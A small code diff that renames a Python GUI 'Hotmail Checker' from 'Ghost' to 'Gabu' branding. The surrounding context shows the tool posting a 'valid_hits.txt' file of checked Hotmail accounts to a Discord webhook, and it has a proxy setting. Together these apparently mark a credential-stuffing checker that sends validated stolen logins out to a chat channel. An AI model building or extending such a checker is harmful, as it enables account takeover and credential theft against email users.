@@ -62,7 +62,7 @@ def send_to_discord(file_path, webhook_url):
                 'file': ('valid_hits.txt', file, 'text/plain')
             }
             payload = {
-                'content': 'VALID HOTMAILS CHECKED WITH GHOST SELLZ CHECKER.\n'
+                'content': 'VALID HOTMAILS CHECKED WITH Gabu CHECKER.\n'
             }
             response = requests.post(webhook_url, data=payload, files=files)
             if response.status_code == 204:
@@ -147,7 +147,7 @@ def browse_proxy():
 
 # Create the main window
 root = ctk.CTk()
-root.title("Ghost Hotmail Checker")
+root.title("Gabu Hotmail Checker")
 root.geometry("800x600")
 
 # Set the theme
